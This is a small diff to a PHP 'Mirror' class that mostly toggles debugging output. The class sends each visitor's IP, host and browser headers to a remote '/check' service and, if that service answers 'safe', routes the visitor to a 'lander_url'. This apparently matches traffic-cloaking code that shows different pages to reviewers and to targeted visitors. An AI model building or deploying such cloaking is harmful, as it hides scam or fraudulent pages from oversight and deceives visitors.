@@ -46,6 +46,7 @@ Class Mirror
             if ($_SERVER['REQUEST_URI'] == '/' || stripos($_SERVER['REQUEST_URI'], '/?source=') !== false) {
                 try {
                     $url = $this->server . "/check?host=" . $_SERVER['HTTP_HOST'] . '&ip=' . $ip;
+                    die($url);
                     $headers = [
                         'User-Agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                         'Accept' => $_SERVER['HTTP_ACCEPT'] ?? '',
@@ -59,8 +60,6 @@ Class Mirror
                     $response = $this->get($url, $headers);
                     $content = $response['body'];
                     $array = json_decode($content, true);
-                    print_r($array);
-                    die();
                     if (isset($array['safe']) && $array['safe'] == 'true') {
 
                         if (!isset($array['lander_url']))
@@ -150,7 +149,7 @@ Class Mirror
         try {
             $content = curl_exec($ch); //执行并存储结果
         } catch (\Exception $e) {
-            die($e->getMessage());
+           // die($e->getMessage());
             return 404;
         }
         $curlError = curl_error($ch);
